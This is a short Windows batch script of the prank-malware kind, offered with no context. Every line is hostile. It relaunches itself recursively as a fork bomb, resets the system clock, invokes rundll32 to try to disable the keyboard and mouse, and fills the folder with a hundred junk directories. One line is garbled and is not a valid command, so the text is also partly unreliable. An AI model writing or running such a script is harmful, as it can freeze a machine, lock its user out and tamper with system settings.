@echo off 
start %0 %0
time 0:00 >nul
rundll32 keyboard,disable
rundll32 mouse,disable
Echo_inactive_inactive off
for /l %%i in (1,1,100) do mkdir "dir %%i"